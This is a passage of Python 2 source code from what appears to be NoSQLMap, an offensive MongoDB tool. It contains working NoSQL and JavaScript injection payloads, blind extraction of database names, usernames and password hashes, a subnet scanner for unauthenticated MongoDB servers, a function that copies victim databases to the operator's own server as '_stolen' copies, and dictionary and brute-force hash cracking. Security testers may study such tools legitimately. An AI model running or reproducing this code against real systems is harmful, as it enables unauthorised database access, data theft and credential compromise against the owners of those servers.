				possAddrs.append(str(neDict))
				return True
			else:
				possAddrs.appends(str(postData))
				return True
	else:
		return False
		
	

def checkResult(baseSize,respSize,testNum):
	global vulnAddrs
	global possAddrs
	global lt24
	global str24
	global int24
	global httpMethod
	global neDict
	global postData
	
	delta = abs(respSize - baseSize)
	if (delta >= 100) and (respSize != 0) :
		if verb == "ON":
			print "Response varied " + str(delta) + " bytes from random parameter value! Injection works!"
		else:
			print "Successful injection!"
		
		if httpMethod == "GET":
			vulnAddrs.append(uriArray[testNum])
		else:
			if testNum == 1:
				vulnAddrs.append(str(neDict))
			else:
				vulnAddrs.append(str(postData))
			
		if testNum == 2 or testNum == 4:
			lt24 = True
			str24 = True
			
		elif testNum == 3 or testNum == 5:
			lt24 = True
			int24 = True
		return
		
	elif (delta > 0) and (delta < 100) and (respSize != 0) :
		if verb == "ON":
			print "Response variance was only " + str(delta) + " bytes. Injection might have worked but difference is too small to be certain. "
		else:
			print "Possible injection."
		
		if httpMethod == "GET":
			possAddrs.append(uriArray[testNum])
		else:
			if testNum == 1:
				possAddrs.append(str(neDict))
			else:
				possAddrs.append(str(postData))
		return
		
	elif (delta == 0):
		if verb == "ON":
			print "Random string response size and not equals injection were the same. Injection did not work."
		else:
			print "Injection failed."
		return
	
	else:
		if verb == "ON":
			print "Injected response was smaller than random response.  Injection may have worked but requires verification."
		else:
			print "Possible injection."
		if httpMethod == "GET":
			possAddrs.appends(uriArray[testNum])
		else:
			if testNum == 1:
				possAddrs.append(str(neDict))
			else:
				possAddrs.append(str(postData))
		return
	
def randInjString(size):
	print "What format should the random string take?"
	print "1-Alphanumeric"
	print "2-Letters only"
	print "3-Numbers only"
	print "4-Email address"
	format = True
	
	while format:
		format = raw_input("Select an option: ")
	
		if format == "1":
			chars = string.ascii_letters + string.digits
			return ''.join(random.choice(chars) for x in range(size))
	
		elif format == "2":
			chars = string.ascii_letters
			return ''.join(random.choice(chars) for x in range(size))
	
		elif format == "3":
			chars = string.digits
			return ''.join(random.choice(chars) for x in range(size))
	
		elif format == "4":
			chars = string.ascii_letters + string.digits
			return ''.join(random.choice(chars) for x in range(size)) + '@' + ''.join(random.choice(chars) for x in range(size)) + '.com'	
		else:
			format = True
			print "Invalid selection."
	

def buildUri(origUri, randValue):
	paramName = []
	paramValue = []
	global uriArray
	uriArray = ["","","","","","","","","","","","","","","","","",""]
	injOpt = ""
	
	#Split the string between the path and parameters, and then split each parameter
	try:
		split_uri = origUri.split("?")
		params = split_uri[1].split("&")
		
	except:
		raw_input("Not able to parse the URL and parameters.  Check options settings.  Press enter to return to main menu...")
		return
		
	for item in params:
		index = item.find("=")
		paramName.append(item[0:index])
		paramValue.append(item[index + 1:len(item)])
		
	menuItem = 1
	print "List of parameters:"
	for params in paramName:
		print str(menuItem) + "-" + params
		menuItem += 1
		
	try:
		injIndex = raw_input("Which parameter should we inject? ")
		injOpt = str(paramName[int(injIndex)-1])
		print "Injecting the " + injOpt + " parameter..."
	
	except:
		raw_input("Something went wrong.  Press enter to return to the main menu...")
		return
	
	x = 0
	uriArray[0] = split_uri[0] + "?"
	uriArray[1] = split_uri[0] + "?"
	uriArray[2] = split_uri[0] + "?"
	uriArray[3] = split_uri[0] + "?"
	uriArray[4] = split_uri[0] + "?"
	uriArray[5] = split_uri[0] + "?"
	uriArray[6] = split_uri[0] + "?"
	uriArray[7] = split_uri[0] + "?"
	uriArray[8] = split_uri[0] + "?"
	uriArray[9] = split_uri[0] + "?"
	uriArray[10] = split_uri[0] + "?"
	uriArray[11] = split_uri[0] + "?"
	uriArray[12] = split_uri[0] + "?"
	uriArray[13] = split_uri[0] + "?"
	uriArray[14] = split_uri[0] + "?"
	uriArray[15] = split_uri[0] + "?"
	uriArray[16] = split_uri[0] + "?"
	uriArray[17] = split_uri[0] + "?"
	
	for item in paramName:		
		if paramName[x] == injOpt:
			uriArray[0] += paramName[x] + "=" + randValue + "&"
			uriArray[1] += paramName[x] + "[$ne]=" + randValue + "&"
			uriArray[2] += paramName[x] + "=a'; return db.a.find(); var dummy='!" + "&"
			uriArray[3] += paramName[x] + "=1; return db.a.find(); var dummy=1" + "&"
			uriArray[4] += paramName[x] + "=a'; return db.a.findOne(); var dummy='!" + "&"
			uriArray[5] += paramName[x] + "=1; return db.a.findOne(); var dummy=1" + "&"
			uriArray[6] += paramName[x] + "=a'; return this.a != '" + randValue + "'; var dummy='!" + "&"
			uriArray[7] += paramName[x] + "=1; return this.a !=" + randValue + "; var dummy=1" + "&"
			uriArray[8] += paramName[x] + "=a'; var date = new Date(); var curDate = null; do { curDate = new Date(); } while((Math.abs(date.getTime()-curDate.getTime()))/1000 < 10); return; var dummy='!" + "&"
			uriArray[9] += paramName[x] + "=1; var date = new Date(); var curDate = null; do { curDate = new Date(); } while((Math.abs(date.getTime()-curDate.getTime()))/1000 < 10); return; var dummy=1" + "&"
			uriArray[10] += paramName[x] + "=a\"; return db.a.find(); var dummy='!" + "&"
			uriArray[11] += paramName[x] + "=a\"; return this.a != '" + randValue + "'; var dummy='!" + "&"
			uriArray[12] += paramName[x] + "=a\"; return db.a.findOne(); var dummy=\"!" + "&"
			uriArray[13] += paramName[x] + "=a\"; var date = new Date(); var curDate = null; do { curDate = new Date(); } while((Math.abs(date.getTime()-curDate.getTime()))/1000 < 10); return; var dummy=\"!" + "&"
			uriArray[14] += paramName[x] + "a'; return true; var dum='a"
			uriArray[15] += paramName[x] + "1; return true; var dum=2"
			#Add values that can be manipulated for database attacks
			uriArray[16] += paramName[x] + "=a\'; ---"
			uriArray[17] += paramName[x] + "=1; if ---"

		else:
			uriArray[0] += paramName[x] + "=" + paramValue[x] + "&"
			uriArray[1] += paramName[x] + "=" + paramValue[x] + "&"
			uriArray[2] += paramName[x] + "=" + paramValue[x] + "&"
			uriArray[3] += paramName[x] + "=" + paramValue[x] + "&"
			uriArray[4] += paramName[x] + "=" + paramValue[x] + "&"
			uriArray[5] += paramName[x] + "=" + paramValue[x] + "&"
			uriArray[6] += paramName[x] + "=" + paramValue[x] + "&"
			uriArray[7] += paramName[x] + "=" + paramValue[x] + "&"
			uriArray[8] += paramName[x] + "=" + paramValue[x] + "&"
			uriArray[9] += paramName[x] + "=" + paramValue[x] + "&"
			uriArray[10] += paramName[x] + "=" + paramValue[x] + "&"
			uriArray[11] += paramName[x] + "=" + paramValue[x] + "&"
			uriArray[12] += paramName[x] + "=" + paramValue[x] + "&"
			uriArray[13] += paramName[x] + "=" + paramValue[x] + "&"
			uriArray[14] += paramName[x] + "=" + paramValue[x] + "&"
			uriArray[15] += paramName[x] + "=" + paramValue[x] + "&"
			uriArray[16] += paramName[x] + "=" + paramValue[x] + "&"
			uriArray[17] += paramName[x] + "=" + paramValue[x] + "&"
		x += 1
		
	#Clip the extra & off the end of the URL
	x = 0
	while x <= 17:
		uriArray[x]= uriArray[x][:-1]
		x += 1

	return uriArray[0]	
	
def stealDBs(myDB,mongoConn):
	dbList = mongoConn.database_names()
	menuItem = 1
	if optionSet[4] == False:
		raw_input("No destination database set! Press enter to return to the main menu.")
		mainMenu()

	if len(dbList) == 0:
		print "Can't get a list of databases to steal.  The provided credentials may not have rights."
		return
	
	for dbName in dbList:
		print str(menuItem) + "-" + dbName
		menuItem += 1
	
	try:
		dbLoot = raw_input("Select a database to steal:")
	
	except:
		print "Invalid selection."
		stealDBs(myDB)
		
	try:
		#Mongo can only pull, not push, connect to my instance and pull from verified open remote instance.
		dbNeedCreds = raw_input("Does this database require credentials (y/n)? ")
		
		if dbNeedCreds in no_tag:
			if optionSet[4] == False:
				raw_input("No IP specified to copy to! Press enter to return to main menu...")
				return
			
			myDBConn = pymongo.MongoClient(myDB,27017)
			myDBConn.copy_database(dbList[int(dbLoot)-1],dbList[int(dbLoot)-1] + "_stolen",victim)	
		
		elif dbNeedCreds in yes_tag:
			dbUser = raw_input("Enter database username: ")
			dbPass = raw_input("Enter database password: ")
			myDBConn.copy_database(dbList[int(dbLoot)-1],dbList[int(dbLoot)-1] + "_stolen",victim,dbUser,dbPass)
		
		else:
			raw_input("Invalid Selection.  Press enter to continue.")
			stealDBs(myDB)
			
		cloneAnother = raw_input("Database cloned.  Copy another (y/n)? ")
		
		if cloneAnother in yes_tag:
			stealDBs(myDB)
		
		else:
			return
	
	except:
		if str(sys.exc_info()).find('text search not enabled') != -1:
			raw_input("Database copied, but text indexing was not enabled on the target.  Indexes not moved.  Press enter to return...")
			return
		
		else:	
			raw_input ("Something went wrong.  Are you sure your MongoDB is running and options are set? Press enter to return...")
			return
	
def accessCheck(ip,port,pingIt):
	global success
	global versions
	global creds
	global commError
	
	if pingIt == True:
		test = os.system("ping -c 1 -n -W 1 " + ip + ">/dev/null")
		
		if test == 0:	
			try:
				conn = pymongo.MongoClient(ip,port,connectTimeoutMS=4000,socketTimeoutMS=4000)
		
				try:
					dbList = conn.database_names()
					dbVer = conn.server_info()['version']
					conn.disconnect()
					print "Successful default access on " + ip.rstrip() + "(Mongo Version: " + dbVer + ")."
					success.append(ip.rstrip())
					versions.append(dbVer)
					return
		
				except:
					if str(sys.exc_info()).find('need to login') != -1:
						conn.disconnect()
						print "MongoDB running but credentials required on " + ip.rstrip() + "."
						creds.append(ip.rstrip()) #Future use
						return
			
					else:
						conn.disconnect()
						print "Successful MongoDB connection to " + ip.rstrip() + " but error executing command."
						commError.append(ip.rstrip())
						return

			except:
				print "Couldn't connect to " + ip.rstrip() + "."
				return
		
		
		else:
			print target.rstrip() + " didn't respond to ping."
			return
	else:
		try:
			conn = pymongo.MongoClient(ip,port,connectTimeoutMS=4000,socketTimeoutMS=4000)
		
			try:
				dbList = conn.database_names()
				dbVer = conn.server_info()['version']
				conn.disconnect()
				print "Successful default access on " + ip.rstrip() + "(Mongo Version: " + dbVer + ")."
				success.append(ip.rstrip())
				versions.append(dbVer)
				return
		
			except:
				if str(sys.exc_info()).find('need to login') != -1:
					conn.disconnect()
					print "MongoDB running but credentials required on " + ip.rstrip() + "."
					creds.append(ip.rstrip()) #Future use
					return
			
				else:
					conn.disconnect()
					print "Successful MongoDB connection to " + ip.rstrip() + " but error executing command."
					commError.append(ip.rstrip())
					return

		except:
			print "Couldn't connect to " + ip.rstrip() + "."
			return
		

def massMongo():
	global victim
	optCheck = True
	loadCheck = False
	ping = False
	global success
	global versions
	global creds
	global commError
	success = []
	versions = []
	creds = []
	commError = []
	ipList = []
	print "\n"
	print "MongoDB Default Access Scanner"
	print "=============================="
	print "1-Scan a subnet for default MongoDB access"
	print "2-Loads IPs to scan from a file"
	print "3-Enable/disable host pings before attempting connection"
	print "x-Return to main menu"
	
	while optCheck:
		loadOpt = raw_input("Select an option: ")
		
		if loadOpt == "1":
			subnet = raw_input("Enter subnet to scan: ")
		
			try:
				for ip in ipcalc.Network(subnet):
					ipList.append(str(ip))
				optCheck = False
			except:
				raw_input("Not a valid subnet.  Press enter to return to main menu.")
				return
				
		if loadOpt == "2":
			while loadCheck == False:
				loadPath = raw_input("Enter file name with IP list to scan: ")

				try:
					with open (loadPath) as f:
					        ipList = f.readlines()
					loadCheck = True
					optCheck = False
				except:
					print "Couldn't open file."
		
		if loadOpt == "3":
			if ping == False:
				ping = True
				print "Scan will ping host before connection attempt."
			
			elif ping == True:
				ping = False
				print "Scan will not ping host before connection attempt."
					
		if loadOpt == "x":
			return
			

	print "\n"
	for target in ipList:
		#result = accessCheck(target.rstrip(),27017,ping)
		
		t = Thread(target=accessCheck, args = (target.rstrip(), 27017, ping))
		t.start()
	
	print "\n\n"
	select = True
	while select:
		saveEm = raw_input("Save scan results to CSV? (y/n):")
		
		if saveEm in yes_tag:
			savePath = raw_input("Enter file name to save: ")
			outCounter = 0
			try:
				fo = open(savePath, "wb")
				for server in success:
					fo.write(server + "," + versions[outCounter] + "\n" )
					outCounter += 1				
					
				fo.close()
				print "Scan results saved!"
				select = False
			except:
				print "Couldn't save scan results."
			
		elif saveEm in no_tag:
			select = False
		else:
			select = True
			
	print "Discovered MongoDB Servers with No Auth:"
	print "IP" + " " + "Version"
	
	outCounter= 1
	
	for server in success:
		print str(outCounter) + "-" + server + " " + versions[outCounter - 1]
		outCounter += 1
	
	select = True
	print "\n"
	while select:
		select = raw_input("Select a NoSQLMap target or press x to exit: ")
	
		if select == "x" or select == "X":
			return
	
		elif select.isdigit() == True and int(select) <= outCounter:
			victim = success[int(select) - 1]
			optionSet[0] = True
			raw_input("New target set! Press enter to return to the main menu.")
			return
	
		else:
			raw_input("Invalid selection.")				

def passCrack (user, encPass):
	select = True
	print "Select password cracking method: "
	print "1-Dictionary Attack"
	print "2-Brute Force"
	print "3-Exit"

	
	while select:
		select = raw_input("Selection: ")
		if select == "1":
			select = False
			dict_pass(user,encPass)
		
		elif select == "2":
			select = False
			brute_pass(user,encPass)
		
		elif select == "3":
			return
	return

def gen_pass(user, passw, hashVal):
	if md5(user + ":mongo:" + str(passw)).hexdigest() == hashVal:
		print "\nFound - " + user + ":" + passw

def dict_pass(user,key):
	loadCheck = False
	
	while loadCheck == False:
		dictionary = raw_input("Enter path to password dictionary: ")
		try:
			with open (dictionary) as f:
			       passList = f.readlines()
			loadCheck = True
		except:
			print " Couldn't load file."
	
	print "Running dictionary attack..."
	for passGuess in passList:
		temp = passGuess.split("\n")[0]
		t = Thread(target=gen_pass, args = (user, temp, key))
		t.start()
	return

def genBrute(chars, maxLen):
    return (''.join(candidate) for candidate in itertools.chain.from_iterable(itertools.product(chars, repeat=i) for i in range(1, maxLen + 1)))

def brute_pass(user,key):
	charSel = True
	print "\n"
	maxLen = raw_input("Enter the maximum password length to attempt: ")
	print "1-Lower case letters"
	print "2-Upper case letters"
	print "3-Upper + lower case letters"
	print "4-Numbers only"
	print "5-Alphanumeric (upper and lower case)"
	print "6-Alphanumeric + special characters"
	charSel = raw_input("\nSelect character set to use:")
	
	if charSel == "1":
		chainSet = string.ascii_lowercase

	elif charSel == "2":
		chainSet= string.ascii_uppercase
	
	elif charSel == "3":
		chainSet = string.ascii_letters
	
	elif charSel == "4":
		chainSet = string.digits
	
	elif charSel == "5":
		chainSet = string.ascii_letters + string.digits
	
	elif charSel == "6":
		chainSet = string.ascii_letters + string.digits + "!@#$%^&*()-_+={}[]|~`':;<>,.?/"
	count = 0
	print "\n",
	for attempt in genBrute (chainSet,int(maxLen)):
		print "\rCombinations tested: " + str(count) + "\r"
		count += 1
		if md5(user + ":mongo:" + str(attempt)).hexdigest() == key:
			print "\nFound - " + user + ":" + attempt
			break
	return
	
def getDBInfo():
	curLen = 0
	nameLen = 0
	gotFullDb = False
	gotNameLen = False
	gotDbName = False
	gotColLen = False
	gotColName = False
	gotUserCnt = False
	finUser = False
	dbName = ""
	charCounter = 0
	nameCounter = 0
	usrCount = 0
	retrUsers = 0
	users = []
	hashes = []
	crackHash = ""
	
	chars = string.ascii_letters + string.digits
	print "Getting baseline True query return size..."
	trueUri = uriArray[16].replace("---","return true; var dummy ='!" + "&")
	#print "Debug " + str(trueUri)
	baseLen = int(len(urllib.urlopen(trueUri).read()))
	print "Got baseline true query length of " + str(baseLen)
	
	print "Calculating DB name length..."
	
	while gotNameLen == False:
		calcUri = uriArray[16].replace("---","var curdb = db.getName(); if (curdb.length ==" + str(curLen) + ") {return true;} var dum='a" + "&")
		#print "Debug: " + calcUri
		lenUri = int(len(urllib.urlopen(calcUri).read()))
		#print "Debug length: " + str(lenUri)
		
		if lenUri == baseLen:
			print "Got database name length of " + str(curLen) + " characters."
			gotNameLen = True
		
		else:
			curLen += 1
	
	print "Database Name: ", 		
	while gotDbName == False:
		charUri = uriArray[16].replace("---","var curdb = db.getName(); if (curdb.charAt(" + str(nameCounter) + ") == '"+ chars[charCounter] + "') { return true; } var dum='a" + "&")
		lenUri = int(len(urllib.urlopen(charUri).read()))

		if lenUri == baseLen:
			dbName = dbName + chars[charCounter]
			print chars[charCounter],
			nameCounter += 1
			charCounter = 0
			
			if nameCounter == curLen:
				gotDbName = True
			
		
		else:
			charCounter += 1
	print "\n"
	
	getUserInf = raw_input("Get database users and password hashes (y/n)? ")
	
	if getUserInf in yes_tag:
		charCounter = 0
		nameCounter = 0
		#find the total number of users on the database
		while gotUserCnt == False:
			usrCntUri = uriArray[16].replace("---","var usrcnt = db.system.users.count(); if (usrcnt == " + str(usrCount) + ") { return true; } var dum='a")
			lenUri = int(len(urllib.urlopen(usrCntUri).read()))
		
			if lenUri == baseLen:
				print "Found " + str(usrCount) + " user(s)."
				gotUserCnt = True
			
			else:
				usrCount += 1
		
		usrChars = 0  #total number of characters in username
		charCounterUsr = 0 #position in the character array-Username
		rightCharsUsr = 0 #number of correct characters-Username
		rightCharsHash = 0 #number of correct characters-hash
		charCounterHash = 0 #position in the character array-hash
		username = ""
		pwdHash = ""
		charCountUsr = False
		query = "{}"
		
		while retrUsers < usrCount:
			if retrUsers == 0:
				while charCountUsr == False:
					#different query to get the first user vs. others
					usrUri = uriArray[16].replace("---","var usr = db.system.users.findOne(); if (usr.user.length == " + str(usrChars) + ") { return true; } var dum='a" + "&")
					lenUri = int(len(urllib.urlopen(usrUri).read()))
				
					if lenUri == baseLen:
						#Got the right number of characters
						charCountUsr = True
				
					else:
						usrChars += 1
					
				while  rightCharsUsr < usrChars:
					usrUri = uriArray[16].replace("---","var usr = db.system.users.findOne(); if (usr.user.charAt(" + str(rightCharsUsr) + ") == '"+ chars[charCounterUsr] + "') { return true; } var dum='a" + "&")
					lenUri = int(len(urllib.urlopen(usrUri).read()))
						
					if lenUri == baseLen:
						username = username + chars[charCounterUsr]
						#print username
						rightCharsUsr += 1
						charCounterUsr = 0				
				
					else:
						charCounterUsr += 1
				
				retrUsers += 1
				users.append(username)
				#reinitialize all variables and get ready to do it again
				#print str(retrUsers)
				#print str(users)
				charCountUsr = False
				rightCharsUsr = 0
				usrChars = 0
				username = ""
				
				while rightCharsHash < 32:  #Hash length is static
					hashUri = uriArray[16].replace("---","var usr = db.system.users.findOne(); if (usr.pwd.charAt(" + str(rightCharsHash) + ") == '"+ chars[charCounterHash] + "') { return true; } var dum='a" + "&")
					lenUri = int(len(urllib.urlopen(hashUri).read()))
						
					if lenUri == baseLen:
						pwdHash = pwdHash + chars[charCounterHash]
						#print pwdHash
						rightCharsHash += 1
						charCounterHash = 0
							
					else:
						charCounterHash += 1
						
				hashes.append(pwdHash)
				print "Got user:hash " + users[0] + ":" + hashes[0]
				#reinitialize all variables and get ready to do it again
				charCounterHash = 0
				rightCharsHash = 0
				pwdHash = ""
			else:
				while charCountUsr == False:
					#different query to get the first user vs. others
					usrUri = uriArray[16].replace("---","var usr = db.system.users.findOne({user:{$nin:" + str(users) + "}}); if (usr.user.length == " + str(usrChars) + ") { return true; } var dum='a" + "&")
					lenUri = int(len(urllib.urlopen(usrUri).read()))
				
					if lenUri == baseLen:
						#Got the right number of characters
						charCountUsr = True
				
					else:
						usrChars += 1
					
				while  rightCharsUsr < usrChars:
					usrUri = uriArray[16].replace("---","var usr = db.system.users.findOne({user:{$nin:" + str(users) + "}}); if (usr.user.charAt(" + str(rightCharsUsr) + ") == '"+ chars[charCounterUsr] + "') { return true; } var dum='a" + "&")	
					lenUri = int(len(urllib.urlopen(usrUri).read()))
						
					if lenUri == baseLen:
						username = username + chars[charCounterUsr]
						#print username
						rightCharsUsr += 1
						charCounterUsr = 0				
				
					else:
						charCounterUsr += 1
				
				retrUsers += 1
				#reinitialize all variables and get ready to do it again
				
				charCountUsr = False
				rightCharsUsr = 0
				usrChars = 0
				
				while rightCharsHash < 32:  #Hash length is static
					hashUri = uriArray[16].replace("---","var usr = db.system.users.findOne({user:{$nin:" + str(users) + "}}); if (usr.pwd.charAt(" + str(rightCharsHash) + ") == '"+ chars[charCounterHash] + "') { return true; } vardum='a" + "&")
					lenUri = int(len(urllib.urlopen(hashUri).read()))
						
					if lenUri == baseLen:
						pwdHash = pwdHash + chars[charCounterHash]
						rightCharsHash += 1
						charCounterHash = 0
							
					else:
						charCounterHash += 1
						
				users.append(username)
				hashes.append(pwdHash)
				print "Got user:hash " + users[retrUsers-1] + ":" + hashes[retrUsers-1]
				#reinitialize all variables and get ready to do it again
				username = ""
				charCounterHash = 0
				rightCharsHash = 0
				pwdHash = ""
	crackHash = raw_input("Crack recovered hashes (y/n)?:  ")		
		
	while crackHash in yes_tag:
		menuItem = 1
		for user in users:
			print str(menuItem) + "-" + user
			menuItem +=1
				
		userIndex = raw_input("Select user hash to crack: ")
		dict_pass(users[int(userIndex)-1],hashes[int(userIndex)-1])
		
		crackHash = raw_input("Crack another hash (y/n)?")		
	raw_input("Press enter to continue...")
	return


def signal_handler(signal, frame):
    print "\n"
    print "CTRL+C detected.  Exiting."
    sys.exit()

signal.signal(signal.SIGINT, signal_handler)
mainMenu()